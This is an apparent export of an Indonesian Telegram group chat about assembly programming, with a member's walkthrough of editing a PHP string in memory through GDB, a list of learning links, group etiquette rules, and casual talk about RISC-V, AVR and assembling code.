+278,277,"Ini structnya\n```typedef struct _zend_string {\n  zend_refcounted_h gc;\n  zend_ulong h;\n  size_t len;\n  char val[1];\n} zend_string;\n\n```Ukuran tiap struct member:\nzend_refcounted_h 8 bytes (yang digaris bawahi ijo)\nzend_ulong 8 bytes (yang digaris bawahi merah)\nsize_t 8 bytes (yang digaris bawahi biru)\nchar 1 byte (but, struct hack) (yang digaris bawahi ungu)",29,6,2019,7,34,44,Ammar Faizi,,0,ammarfaizi2
+279,0,Terus kita lanjut lagi pasang breakpoint di mapped memory-nya.,29,6,2019,7,37,8,Ammar Faizi,,0,ammarfaizi2
+280,0,,29,6,2019,7,37,15,Ammar Faizi,,0,ammarfaizi2
+282,0,"Di sini mapped memory, kesimpen di rcx, jadi bisa kita pasang breakpoint pakai nilai rcx.",29,6,2019,7,38,29,Ammar Faizi,,0,ammarfaizi2
+283,0,,29,6,2019,7,39,24,Ammar Faizi,,0,ammarfaizi2
+284,0,"Udah berhasil masuk ke mapped memory, tapi belum ada isinya, baru ret doang.",29,6,2019,7,39,47,Ammar Faizi,,0,ammarfaizi2
+285,0,Di sini kita cek nilai rdi dulu.,29,6,2019,7,41,10,Ammar Faizi,,0,ammarfaizi2
+286,0,"Untuk mencapai ke address `0x00007ffff3001780`, berarti kita perlu dereference 2 kali.",29,6,2019,7,41,28,Ammar Faizi,,0,ammarfaizi2
+287,0,Nah baru di sini kita dapet gambaran payload yang harus dipakai gimana.,29,6,2019,7,41,39,Ammar Faizi,,0,ammarfaizi2
+288,0,,29,6,2019,7,46,44,Ammar Faizi,,0,ammarfaizi2
+289,288,Payload akhirnya jadi gini,29,6,2019,7,46,58,Ammar Faizi,,0,ammarfaizi2
+290,0,,29,6,2019,7,47,23,Ammar Faizi,,0,ammarfaizi2
+291,0,":// mntp, ak msih butuh membaca",29,6,2019,7,48,15,loncat,,0,p4kl0nc4t
+292,288,"mov rax, [rdi] ; dereference\nmov rax, [rax] ; dereference lagi (dapat address `0x00007ffff3001780`)\nadd rax, 24 ; Skip 24 bytes biar menuju ke char val[1]. (Ref: https://t.me/AssemblyID/278)\nmov dword [rax + 11] , "" 321""\n\nchar val[1] isinya `""Hello World 123""`.\n\nrax ada di posisi char 'H', kita tambah 11 bytes lagi jadi di posisi karakter spasi, kalau diambil secara dword jadinya "" 123"".\n\nHabis itu mov dword, kasih value "" 321""\n\ndword = 32 bit, jadi bakal keganti 4 bytes.",29,6,2019,7,50,1,Ammar Faizi,,0,ammarfaizi2
+293,291,"No problem pak, mari kita sharing-sharing di sini.",29,6,2019,7,51,51,Ammar Faizi,,0,ammarfaizi2
+294,0,Sheupp,29,6,2019,7,52,11,loncat,,0,p4kl0nc4t
+295,0,Masih nntn series asm x86_64 yg dishare kmren wkwkw,29,6,2019,7,55,52,loncat,,0,p4kl0nc4t
+296,278,"zend framework, ga pernah nyentuh ini makhluk",29,6,2019,7,57,25,hadi,wijaya,0,Xn1nj4
+297,0,,29,6,2019,11,31,27,Lukis,,0,flukis4
+298,295,Yg mana?,29,6,2019,11,33,25,,,0,
+299,115,Up up,29,6,2019,11,35,20,loncat,,0,p4kl0nc4t
+300,0,Disini mbahas ASM buat microcontroller AVR juga nggak?,29,6,2019,11,38,5,Lukis,,0,flukis4
+301,300,Boleh aja pak,29,6,2019,11,39,26,Ammar Faizi,,0,ammarfaizi2
+302,0,Rata-rata ngebahas x86_64,29,6,2019,11,39,27,loncat,,0,p4kl0nc4t
+303,302,"Iyes, rata-rata member sini ngertinya x86. Tapi bahas arch lain gak masalah sih wkwk.",29,6,2019,11,40,9,Ammar Faizi,,0,ammarfaizi2
+304,0,,29,6,2019,11,44,45,Mahmud,,0,mhmdsya
+305,0,,29,6,2019,11,52,36,yogy,rahmawan,0,yogyrahmawan
+306,0,"**[Kumpulan Link Pembelajaran Assembly]**\n1. Video Tutorial Assembly x86_64: https://www.youtube.com/watch?v=VQAKkuLL31g&list=PLetF-YjXm-sCH6FrTz4AQhfH6INDQvQSn\n\n2. The Art of Intel x86 Assembly: https://archive.teainside.org/fcs/Art%20Of%20Intel%20x86%20Assembly.pdf\n\n3. Intel 80386 Reference Programmer's Manual: https://pdos.csail.mit.edu/6.828/2004/readings/i386/toc.htm\n\n4. NASM vs GAS: https://www.ibm.com/developerworks/linux/library/l-gas-nasm/index.html\n\n5. Software Optimization Resources (Agner Fog's): http://www.agner.org/optimize/\n\n6. Randall Hyde's Art of Assembly: http://www.plantation-productions.com/Webster/www.artofasm.com/index.html\n\n7. Ralf Brown's Interrupt List (RBIL): http://www.ctyme.com/rbrown.htm\n\n8. ""Machine Language for C64 and Other Commodore Computers"", by Jim Butterfield: https://goo.gl/qx5X6Z\n\n9. x86-64: Examples and tests: https://github.com/alecov/asmtests (Always WIP)\n\n10. Stack frame layout x86_64: https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64\n\n11. Identify your Intel processor: https://software.intel.com/en-us/articles/intel-architecture-and-processor-identification-with-cpuid-model-and-family-numbers\n\n12. xorpd's assembly riddles: https://www.xorpd.net/pages/xchg_rax/snip_01.html\n\n13. ""The Linux kernel"", by Andries Brouwer: https://www.win.tue.nl/~aeb/linux/lk/lk.html\n\n14. Belajar Assembly lewat Golang:\nhttps://quasilyte.dev/blog/post/go-asm-complementary-reference/\n\n15. Awesome ASM:\nhttps://github.com/lurumdare/awesome-asm\n\n16. http://ref.x86asm.net/coder64.html\n\n17. http://www.koth.org/pmars/\n\nSilakan reply jika ingin menambahkan.",29,6,2019,12,2,55,Ammar Faizi,,0,ammarfaizi2
+307,0,"**[Etika Bertanya di Grup]**\n1. Gunakan bahasa yang sopan.\n2. Jika bertanya tentang problem solving, mohon dijelaskan secara mendetail tentang:\n > Masalah apa yang dialami.\n > Usaha apa saja yang sudah dilakukan.\n > Hasil yang diinginkan seperti apa.\n > Tunjukkan error message pada masalahnya jika ada.\n > Sertakan source code dalam pertanyaan jika perlu.\n > Jika mengirimkan code yang panjang, gunakan paste tool seperti pastebin.com, hastebin.com, gist.github.com, dll.\n3. Jika hendak menunjukkan output pada layar monitor, mohon kirimkan screenshot (jika memungkinkan), jangan difoto dengan kamera.\n4. Bersabar jika pertanyaan tidak mendapatkan respon, karena tidak semua orang di grup mampu secara waktu dan ilmu untuk menjawab pertanyaan Anda.\n5. Ucapkan terima kasih kepada orang yang telah membantu masalah Anda.",29,6,2019,12,3,24,Ammar Faizi,,0,ammarfaizi2
+308,0,,29,6,2019,12,3,25,,,0,
+309,0,"Selamat datang di grup Assembly Programming, grup untuk sarana diskusi pemrograman Assembly. Mayoritas pembahasan di sini adalah arsitektur x86. Namun tidak terbatas pada itu, pembahasan arsitektur lain juga dipersilakan.\n\nBaca etika bertanya di sini: https://t.me/AssemblyID/307\nKumpulan link pembelajaran Assembly: https://t.me/AssemblyID/306",29,6,2019,12,3,50,Ammar Faizi,,0,ammarfaizi2
+310,309,,29,6,2019,12,3,54,Ammar Faizi,,0,ammarfaizi2
+311,0,Ah mantap,29,6,2019,12,23,53,loncat,,0,p4kl0nc4t
+312,0,,29,6,2019,13,8,15,Ery E.,Wahyutama,0,e_Wahyutama
+313,0,,29,6,2019,13,10,18,abdil,,0,abdil_1234
+314,300,ayo2,29,6,2019,13,12,16,hadi,wijaya,0,Xn1nj4
+315,0,Pake mcs ya?,29,6,2019,13,29,22,,,0,
+316,315,ayo dibahas bang,29,6,2019,13,31,53,hadi,wijaya,0,Xn1nj4
+317,0,Kajauhan,29,6,2019,13,33,50,Lukis,,0,flukis4
+318,0,,29,6,2019,13,34,13,some,one,0,
+319,0,Haha kejaun n kejadulan mungkin... 😂,29,6,2019,13,34,47,,,0,
+321,0,,29,6,2019,14,5,15,,,0,
+322,0,,29,6,2019,14,21,40,inginpintar,Alfiyanm,0,inginpintar
+323,0,,29,6,2019,14,28,41,Asy'ari,,0,hasyari00
+324,0,,29,6,2019,14,29,34,,,0,
+325,0,,29,6,2019,15,0,50,Bryan,Wahyu,0,bryanwahyukp
+326,0,malam om,29,6,2019,15,1,3,Bryan,Wahyu,0,bryanwahyukp
+327,0,Malam,29,6,2019,15,3,42,Ammar Faizi,,0,ammarfaizi2
+328,0,assembly,29,6,2019,15,4,5,Bryan,Wahyu,0,bryanwahyukp
+329,0,bahasa satu per satu,29,6,2019,15,4,26,Bryan,Wahyu,0,bryanwahyukp
+330,329,Bener,29,6,2019,15,4,57,Ammar Faizi,,0,ammarfaizi2
+331,0,"Tiap jenis processor bakal punya instruction yang beda, jadi gak portable.",29,6,2019,15,5,30,Ammar Faizi,,0,ammarfaizi2
+332,0,yup,29,6,2019,15,6,10,Bryan,Wahyu,0,bryanwahyukp
+333,0,kalau bisa ini,29,6,2019,15,6,17,Bryan,Wahyu,0,bryanwahyukp
+334,0,bisa bikin mobil auto,29,6,2019,15,6,29,Bryan,Wahyu,0,bryanwahyukp
+335,0,Maksudnya gimana?,29,6,2019,15,6,45,Ammar Faizi,,0,ammarfaizi2
+336,0,kalau bisa bahasa assembly bisa bikin mobil auto,29,6,2019,15,7,30,Bryan,Wahyu,0,bryanwahyukp
+337,336,Apaan tuh?,29,6,2019,15,8,9,Ammar Faizi,,0,ammarfaizi2
+338,0,bikin mobil gerak sendiri,29,6,2019,15,8,36,Bryan,Wahyu,0,bryanwahyukp
+339,0,cuma yaa posiblity masih kecil,29,6,2019,15,9,10,Bryan,Wahyu,0,bryanwahyukp
+340,336,auto drive,29,6,2019,15,9,12,hadi,wijaya,0,Xn1nj4
+341,336,Bukannya justru malah device yg bersifat porteble...???!!!,29,6,2019,15,9,23,,,0,
+342,0,computer vision atau sensor based?,29,6,2019,15,9,38,hadi,wijaya,0,Xn1nj4
+343,339,Apa hubungannya anjay,29,6,2019,15,9,40,Ammar Faizi,,0,ammarfaizi2
+344,0,wkwk,29,6,2019,15,9,55,Bryan,Wahyu,0,bryanwahyukp
+345,0,Padahal yang dibahas Assembly gak portable,29,6,2019,15,9,57,Ammar Faizi,,0,ammarfaizi2
+346,0,kata seniorku gitu,29,6,2019,15,10,5,Bryan,Wahyu,0,bryanwahyukp
+347,0,salah ya bang,29,6,2019,15,10,15,Bryan,Wahyu,0,bryanwahyukp
+348,0,,29,6,2019,15,10,22,Bryan,Wahyu,0,bryanwahyukp
+349,0,,29,6,2019,15,10,32,hadi,wijaya,0,Xn1nj4
+350,345,Oo brarti maksdunya assembly d mikroprosesor...???,29,6,2019,15,13,36,,,0,
+351,350,Eh tambah ngawur yaa.. 😁,29,6,2019,15,16,20,,,0,
+352,350,"maksudnya, code assembly yang kita bikin untuk prosessor x86 belum tentu jalan di ARM",29,6,2019,15,17,52,hadi,wijaya,0,Xn1nj4
+353,0,CMIIW,29,6,2019,15,17,56,hadi,wijaya,0,Xn1nj4
+354,353,Oo..,29,6,2019,15,18,45,,,0,
+355,350,"Semua pak, microcontroller juga gak portable.",29,6,2019,15,30,11,Ammar Faizi,,0,ammarfaizi2
+356,0,Mikrokontroler sbg instrumen alat ukur kyknya porteble,29,6,2019,15,32,9,,,0,
+357,356,Contohnya?,29,6,2019,15,32,25,Ammar Faizi,,0,ammarfaizi2
+358,356,"Bahasa assembly nya pak yg nggak portable,",29,6,2019,15,32,57,Lukis,,0,flukis4
+359,356,"Microcontroller kemungkinannya luas pak,\n\nKalau bendanya (microcontroller) ya portable bisa, yg dibahas ini bahasa Assembly nya,",29,6,2019,15,35,6,Lukis,,0,flukis4
+360,0,,29,6,2019,15,35,21,karetglang,,0,jancukkksss
+361,0,👍,29,6,2019,15,44,29,,,0,
+362,0,,29,6,2019,15,45,29,KLMN,,0,ABCDEFGHJIKL_001
+363,0,,29,6,2019,16,4,46,R,D,0,Rdamaya
+364,0,,29,6,2019,19,40,58,Rizkhal,,0,rizkhal
+365,0,,30,6,2019,1,30,5,F,,0,fdedraco
+366,0,,30,6,2019,4,13,53,R A R A S,,0,rarastyas
+367,0,,30,6,2019,7,51,38,Fajar,Ridikc,0,Fajar_ridikc
+368,0,,30,6,2019,13,43,26,Andreas,Widjaja,0,Andreas_Widjaja
+369,205,"saya suka bahasan ini, arduino itu abstraksinya banyak, kalau pakai asm bisa switch 8 pin sekali instruksi",30,6,2019,13,59,45,F,,0,fdedraco
+370,0,tapi ya itu  kalau mau bikin program yang kompleks harus bertapa,30,6,2019,14,1,24,F,,0,fdedraco
+371,0,,30,6,2019,14,18,33,chandra agung rizky,,0,born2ngopi
+373,372,wah,30,6,2019,16,9,13,Bryan,Wahyu,0,bryanwahyukp
+374,372,"woh iya, saya lupa detilnya, terakhir baca di ARM, pun akses memori makan dua siklus.",30,6,2019,17,36,30,F,,0,fdedraco
+375,369,nah mari2,30,6,2019,21,57,22,hadi,wijaya,0,Xn1nj4
+376,0,,30,6,2019,22,40,10,,,0,
+377,0,,1,7,2019,1,52,10,Akbary,Junaedi,0,akbaryjunaedi
+378,0,,1,7,2019,8,41,19,Ahmad Faris Fachrurrobbi,Silmy,0,ahmadfarisfs
+379,0,,1,7,2019,11,38,25,,,0,
+380,0,,2,7,2019,0,53,34,Rizky,Ekasaputra,0,Xhavutra
+381,0,,2,7,2019,1,26,52,ZakiNadhif,,0,zndf0
+382,0,,2,7,2019,7,42,59,,,0,
+384,0,,2,7,2019,10,51,15,Aswad,,0,aswadsun
+385,0,,2,7,2019,11,4,1,Maaf,Merepotkan... 🙏,0,cahgentoo
+386,0,,2,7,2019,11,33,10,FEF,=> {Fitrah Elly Firdaus},0,FEF339
+387,0,,2,7,2019,11,42,48,Ircham,,0,ircham_aji
+388,0,,2,7,2019,12,28,12,Suka,Isnaini,0,kenzanin
+390,0,,2,7,2019,12,33,35,Diem Diem Bae,,0,kasihusername
+391,0,,2,7,2019,12,33,43,Maaf,Merepotkan... 🙏,0,cahgentoo
+392,0,Untuk yang baru bergabung.\n\nAdakah motivasi tertentu mengikuti group ini?\n\n😁,2,7,2019,12,34,7,Maaf,Merepotkan... 🙏,0,cahgentoo
+393,0,Banyak yg dari BGLI keknya nih,2,7,2019,12,34,20,Diem Diem Bae,,0,kasihusername
+395,392,Karena liat tautan grup ini di grup BGLI 😅,2,7,2019,12,34,57,Diem Diem Bae,,0,kasihusername
+397,396,"saya tidak boleh menghakimi, khan ada yang karena kesasar, sekedar mau ngiklan isi blog-nya (youtube-nya), atau barangkali saja ada yang cari jodoooh 😘.",2,7,2019,12,37,3,Maaf,Merepotkan... 🙏,0,cahgentoo
+398,393,Kalau ada yang mau join group2 ini beberapa baru.\n\n👣 @rubyist_cupu\n👣 @idpyplc\n👣 @phpidcommunity\n👣 @nativescript_id\n👣 @micronaut_id\n🕷 @nodejsindo\n🕷 @BackEndID\n🕷 @sass_id\n🐾 @unixlikeindonesia\n🐾 @oss_id\n🐾 @centos_id\n🕷 @TeaInside\n🕷 @AssemblyID\n🕷 @WASM_INDONESIA\n🕷 @javascript_rocks\n🕷 @pwaID\n\n\nUntuk sementara sekian.,2,7,2019,12,37,11,Maaf,Merepotkan... 🙏,0,cahgentoo
+399,0,mantrap hehe. dapat info dari group sebelah. jadi penasaran kayak gimana bahas assembly di telegram hehe,2,7,2019,12,38,38,Suka,Isnaini,0,kenzanin
+400,0,,2,7,2019,13,12,17,Abdul,Adjis,0,abdul_adjis
+401,0,Iijn mantau,2,7,2019,13,12,26,Abdul,Adjis,0,abdul_adjis
+402,392,Cuma pengen tau doang,2,7,2019,13,13,24,Abdul,Adjis,0,abdul_adjis
+403,0,"Nyimak aja,",2,7,2019,13,47,50,Lukis,,0,flukis4
+404,0,,2,7,2019,13,48,14,Birowo,,0,b1r0w0
+405,392,pengen tahu apakah ada pengguna hla aktif di sini? hehe\njuga bahas assembly buat cpu apa saja hehe,2,7,2019,13,59,59,Suka,Isnaini,0,kenzanin
+406,306,belajar assembly lewat golang \nhttps://quasilyte.dev/blog/post/go-asm-complementary-reference/,2,7,2019,14,39,25,Birowo,,0,b1r0w0
+407,406,noted,2,7,2019,14,41,49,hadi,wijaya,0,Xn1nj4
+408,406,"Added, thanks.",2,7,2019,14,46,5,Ammar Faizi,,0,ammarfaizi2
+409,0,"Yang pengen main RISC-V, yang pengen main RISC-V~ 👀",2,7,2019,14,49,32,Moriah,Soewako,0,soewako
+410,0,https://github.com/TheThirdOne/rars,2,7,2019,14,49,32,Moriah,Soewako,0,soewako
+411,410,Starred,2,7,2019,14,58,51,Ammar Faizi,,0,ammarfaizi2
+412,392,Pengen belajar hu mohon bimbingannya hu wkwk,2,7,2019,15,32,48,>> 𝗩𝗶𝗿,•,0,vir_sam
+413,0,,2,7,2019,15,55,18,Albert,Mario,0,berdoezt
+414,0,,2,7,2019,23,37,57,Zamrony P.,Juhara,0,zamronypj
+415,409,mantav,3,7,2019,1,20,57,F,,0,fdedraco
+416,415,Omnya punya hardware-nya?,3,7,2019,14,38,54,Moriah,Soewako,0,soewako
+417,416,"belum, masi nabung buat beli k210 nya sipeed",3,7,2019,22,22,41,F,,0,fdedraco
+418,0,atau nunggu chip riscv baru dari cina jg,3,7,2019,22,23,21,F,,0,fdedraco
+419,0,"konon sih murah, dibawah harga stm32",3,7,2019,22,23,51,F,,0,fdedraco
+420,0,,4,7,2019,4,43,21,Andy,Prasetya,0,andyprasetya
+421,0,Link selingan http://www.funtrivia.com/playquiz/quiz3877032c61cd0.html,4,7,2019,7,37,46,Ammar Faizi,,0,ammarfaizi2
+422,0,,5,7,2019,8,53,57,Paulus,Siahaan,0,
+423,0,,6,7,2019,7,36,7,Nur Hariawan,Bulu,0,nurhariawanbulu
+424,0,,6,7,2019,7,43,0,Wizard,,0,nyxsorcerer
+425,0,,6,7,2019,7,53,12,Akbar,Hariyono,0,akbaryon
+426,0,,6,7,2019,8,30,0,acep,chaniago,0,acprima12
+427,0,,6,7,2019,8,40,15,Baihaqi,Siregar,0,byhqsr
+428,0,,6,7,2019,9,6,36,Taufiqur,Rahman,0,Taufiqur
+429,0,slamat sore semua .. ijin gabung di grup.. btw .. ane member ke 100 ya gan,6,7,2019,9,7,25,Taufiqur,Rahman,0,Taufiqur
+430,0,ane link nya dapet di sebelah,6,7,2019,9,7,39,Taufiqur,Rahman,0,Taufiqur
+431,429,Halo om taufiqur,6,7,2019,9,8,6,>> 𝗩𝗶𝗿,•,0,vir_sam
+432,0,lah ada remaja unyu2 .. left grup lagi ah,6,7,2019,9,8,45,Taufiqur,Rahman,0,Taufiqur
+433,0,Wkkw,6,7,2019,9,9,2,>> 𝗩𝗶𝗿,•,0,vir_sam
+434,0,grup ini nggak ada bot yang nyambut?,6,7,2019,9,9,5,Taufiqur,Rahman,0,Taufiqur
+435,0,ga ada,6,7,2019,9,9,15,>> 𝗩𝗶𝗿,•,0,vir_sam
+436,0,knapa nggak pasang bot?,6,7,2019,9,9,34,Taufiqur,Rahman,0,Taufiqur
+437,0,Cuma bikin spam aja,6,7,2019,9,9,41,⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠,GNU/std::sakty ( ✪ ),0,sunda005
+438,0,heleh,6,7,2019,9,9,52,Taufiqur,Rahman,0,Taufiqur
+439,0,,6,7,2019,9,10,1,⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠,GNU/std::sakty ( ✪ ),0,sunda005
+440,0,,6,7,2019,9,10,54,Taufiqur,Rahman,0,Taufiqur
+441,0,,6,7,2019,9,14,4,Moriah,Soewako,0,soewako
+442,0,,6,7,2019,9,39,26,Andrika wahyu,,0,andwahyu
+443,429,Mestinya dapat angpau,6,7,2019,9,40,22,Maaf,Merepotkan... 🙏,0,cahgentoo
+444,0,,6,7,2019,9,44,7,,,0,
+445,0,"Link selingan https://www.tomshardware.com/news/india-shakti-cpu-processors-sdk-risc-v,39781.html",6,7,2019,10,49,45,Ammar Faizi,,0,ammarfaizi2
+446,0,prosesos risc-v bukannya bahasa asembly nya beda sama bahasa asembly x86 min,6,7,2019,12,58,17,Taufiqur,Rahman,0,Taufiqur
+447,0,nggak tau juga sih,6,7,2019,12,58,23,Taufiqur,Rahman,0,Taufiqur
+448,0,,6,7,2019,15,10,22,Sea Gate,,0,
+449,0,"kulonuwun, saya gisa sigit, penggemar it dan suka oprex,  ijin gabung untuk menimba ilmu,  terimakasih",6,7,2019,15,12,41,Sea Gate,,0,
+450,446,Beda,6,7,2019,15,51,30,Ammar Faizi,,0,ammarfaizi2
+451,449,Welcome pak,6,7,2019,15,51,39,Ammar Faizi,,0,ammarfaizi2
+452,449,,7,7,2019,2,32,18,Maaf,Merepotkan... 🙏,0,cahgentoo
+453,445,shakti risc-v.,7,7,2019,2,38,45,Suka,Isnaini,0,kenzanin
+454,0,kenapa pakai v di akhir ya? systemv riscv? mungkin bersaudara hehe,7,7,2019,2,39,25,Suka,Isnaini,0,kenzanin
+455,454,Karena itu ISA kelima bikinan UCB,7,7,2019,2,45,55,Moriah,Soewako,0,soewako
+456,455,isa ke lima = keadilan sosial bagi rakyat indonesia. hehe.\n\nokeh aku cari2 dulu ucb hehe.\nthanks,7,7,2019,2,47,33,Suka,Isnaini,0,kenzanin
+457,456,berkeley.edu,7,7,2019,2,50,35,Moriah,Soewako,0,soewako
+458,0,,7,7,2019,3,9,49,Harapan,Tambunan,0,ucokcode
+459,0,,7,7,2019,4,17,19,,,0,
+460,0,,7,7,2019,6,6,3,,,0,
+462,0,btw bang,7,7,2019,7,0,31,Bryan,Wahyu,0,bryanwahyukp
+463,0,app buat iot enaknya pake apa?,7,7,2019,7,0,46,Bryan,Wahyu,0,bryanwahyukp
+464,0,,7,7,2019,7,18,53,Fly,,0,kuipr
+465,0,,8,7,2019,3,5,11,Hilmy Izzulhaq,| ARSA Technology,0,hilmy_izzulhaq
+466,463,enaknya yang kamu paham dan bisa deliver produk,8,7,2019,8,21,36,F,,0,fdedraco
+467,446,"beda banget, tp riscv instruksinya lebih terstandarisasi dibanding keluarga lain.",8,7,2019,8,22,49,F,,0,fdedraco
+468,467,Terstandar gimana? Kayanya ISA-ISA lain juga lumayan rapih deh 🤔,8,7,2019,8,46,5,Moriah,Soewako,0,soewako
+469,0,Paling x86 aja yang sampai sekarang aku masih agak nganu bacanya 🙈,8,7,2019,8,46,22,Moriah,Soewako,0,soewako
+470,469,afaik malah x86 yg banyak overlap kayak sse sse2 hehe. tapi paling populer karena backward compability.\ntapi aku sering pakai asm buat avr sama arm saja hehehe. itupun ndak katam.,8,7,2019,9,18,23,Suka,Isnaini,0,kenzanin
+471,468,"aku baru skimming sih, tp ekstensi, dll nya udah di map, jd kalo mau nambah accelerator, dll kode nya bakal binary compactible",8,7,2019,12,24,35,F,,0,fdedraco
+472,471,"Ya kalau begitu, semua ISA juga sama 😅",8,7,2019,12,26,23,Moriah,Soewako,0,soewako
+473,0,"Contoh, di  x86 sekarang ada tambahan MMX SSE/2/3/4 AVX segala macam, binary program lama masih bisa jalan 'kan",8,7,2019,12,27,40,Moriah,Soewako,0,soewako
+474,470,"AVR enak nih, dulu sempat main lama sama ini",8,7,2019,12,28,9,Moriah,Soewako,0,soewako
+475,0,,8,7,2019,12,49,3,Rex,Extensa 🦅,0,rexextensa
+476,0,,8,7,2019,13,5,9,Rhesa,PRAWEDHA - KMOB38K7,0,drprawedha
+477,474,iya simple dipelajari hehehe,8,7,2019,13,23,31,Suka,Isnaini,0,kenzanin
+478,0,,9,7,2019,3,44,48,Moch Rizky,Putra,0,DYNASTYEVO
+479,0,,9,7,2019,12,53,2,Kamal,Arief,0,Kamalarief
+480,474,Masih main pak?,9,7,2019,13,38,25,Lukis,,0,flukis4
+481,480,"Udah ngga, gak punya hardware-nya 🙈",9,7,2019,13,39,12,Moriah,Soewako,0,soewako
+482,0,"Wkwkwk, padahal hardware nya melimpah dipasaran..",9,7,2019,13,39,47,Lukis,,0,flukis4
+483,0,"Iya, tapi mau beli juga gak ada ide mau dipakai apa",9,7,2019,13,40,24,Moriah,Soewako,0,soewako
+484,474,AVR apa ya pak ?,9,7,2019,14,15,9,Maaf,Merepotkan... 🙏,0,cahgentoo
+485,484,Merek mikrokontroler om,9,7,2019,14,15,57,Moriah,Soewako,0,soewako
+486,484,avr mcu nya arduino nano mega hehe,9,7,2019,14,16,15,Suka,Isnaini,0,kenzanin
+487,0,Ooo..oke,9,7,2019,14,21,2,Maaf,Merepotkan... 🙏,0,cahgentoo
+489,488,Thx,9,7,2019,14,33,53,Maaf,Merepotkan... 🙏,0,cahgentoo
+490,488,,9,7,2019,14,34,6,Maaf,Merepotkan... 🙏,0,cahgentoo
+491,488,https://t.me/AssemblyID/306,9,7,2019,14,34,55,Ammar Faizi,,0,ammarfaizi2
+493,0,Cara track lokasi hp lewat nomor hp gimana yah?,9,7,2019,15,55,42,Paulus,Siahaan,0,
+494,0,Ditelpon lalu ditanya 'kamu lagi dimana?',9,7,2019,16,2,24,,,0,
+495,0,Dengan siapa?,9,7,2019,16,2,37,Moriah,Soewako,0,soewako
+496,0,Semalem berbuat apa?,9,7,2019,16,2,57,,,0,
+497,493,"Lain kali kalau nanya dipikir dulu, jangan langsung asal ceplos ae.",9,7,2019,16,2,59,,,0,
+498,0,Disini aku menunggu dan bertanya,9,7,2019,16,4,22,KLMN,,0,ABCDEFGHJIKL_001
+499,0,🤨,9,7,2019,16,4,24,Ammar Faizi,,0,ammarfaizi2
+500,495,Kalo gitu kamu sama dia saja.,9,7,2019,16,19,41,Maaf,Merepotkan... 🙏,0,cahgentoo
+501,493,,9,7,2019,21,27,4,,,0,
+502,0,,10,7,2019,9,40,42,Dry Rez,,0,dryrez
+503,0,,11,7,2019,5,30,10,,,0,
+504,0,,11,7,2019,6,50,51,Phelps,,0,Natt_22
+505,0,https://news.ycombinator.com/item?id=20406058\nThe thread looks interesting but I don't understand anything in it 👀,11,7,2019,12,7,47,Moriah,Soewako,0,soewako
+507,0,sudo apt-get install binutils,11,7,2019,13,58,0,ZakiNadhif,,0,zndf0
+508,0,"Kalo udah ada, nama executablenya ""as""",11,7,2019,13,58,21,ZakiNadhif,,0,zndf0
+509,0,👍,11,7,2019,13,58,38,ZakiNadhif,,0,zndf0
+510,508,"Or ""gas""",11,7,2019,13,59,13,ZakiNadhif,,0,zndf0
+512,0,,11,7,2019,15,46,25,,,0,
+514,0,as Nama_Kode.s -o Nama_Objek.o && ld Nama_Objek.o,11,7,2019,22,31,29,ZakiNadhif,,0,zndf0
+515,0,"Nama_Objek.o itu outputnya, jadi namanya terserah",11,7,2019,22,32,38,ZakiNadhif,,0,zndf0
+516,0,Ubuntu Forums\nhttps://ubuntuforums.org/showthread.php?t=330563,11,7,2019,22,32,59,ZakiNadhif,,0,zndf0
+517,0,"Kayanya kalau mau compile enakan pakai `cc` aja deh 👀\n`cc assembly.s -o binary` works kok, jadi gak perlu jalanin dua perintah",12,7,2019,1,1,1,Moriah,Soewako,0,soewako
+519,0,,12,7,2019,8,24,51,,,0,
+521,517,Iya,12,7,2019,13,51,48,ZakiNadhif,,0,zndf0
+523,0,,13,7,2019,11,46,8,,,0,
+524,0,,13,7,2019,16,0,40,Arief,Banyubiru,0,ariefBanyubiru
+525,306,ini sudah masuk daftar belum ???\nhttps://github.com/lurumdare/awesome-asm\nkemudian bisa pinned kah postingan ini supaya selalu kelihatan ... 😀,13,7,2019,18,11,42,Birowo,,0,b1r0w0
+526,0,,14,7,2019,0,34,16,Zaen,Ars,0,ZaenalArsy
+528,525,"Added, thanks.",14,7,2019,0,41,19,Ammar Faizi,,0,ammarfaizi2
+529,0,,14,7,2019,7,58,13,Alamsyah,ict,0,alamsyah_ict
+531,0,,14,7,2019,11,7,31,andre,,0,bagvsandre
+532,0,,14,7,2019,12,8,13,Bayu,,0,napstermaid
+533,0,https://cs.nyu.edu/courses/spring13/CSCI-GA.1144-001/lecture4.pdf,14,7,2019,14,40,5,Ammar Faizi,,0,ammarfaizi2
+534,0,Wut is that,14,7,2019,14,40,31,ZakiNadhif,,0,zndf0
+535,534,An Assembly x86 ebook.,14,7,2019,14,41,5,Ammar Faizi,,0,ammarfaizi2
+537,0,Oh ok thanks for sharing :),14,7,2019,14,41,17,ZakiNadhif,,0,zndf0
+538,0,Pernah coba bikin Os gk min?,14,7,2019,14,42,21,ZakiNadhif,,0,zndf0
+539,0,Belum pernah.,14,7,2019,14,42,30,Ammar Faizi,,0,ammarfaizi2
+540,0,Coba lah,14,7,2019,14,42,38,ZakiNadhif,,0,zndf0
+541,0,>> Saya baca cerita hidupnya Terry Davis.,14,7,2019,14,43,5,Ammar Faizi,,0,ammarfaizi2
+542,0,Bikin OS dia.,14,7,2019,14,43,11,Ammar Faizi,,0,ammarfaizi2
+543,0,Gimana?,14,7,2019,14,43,17,ZakiNadhif,,0,zndf0
+544,0,"sayang"" pc aja buat os",14,7,2019,14,43,43,,,0,
+545,0,Kenapa?,14,7,2019,14,44,16,ZakiNadhif,,0,zndf0
+546,543,"Beliau ini seorang programmer, mahir di low level language (Assembly). Sampai jadi gila akhirnya, terus bikin OS namanya Temple OS. Kata dia, dia disuruh sama tuhannya bikin OS itu. OS-nya bisa dia pakai buat komunikasi sama tuhannya katanya.",14,7,2019,14,45,8,Ammar Faizi,,0,ammarfaizi2
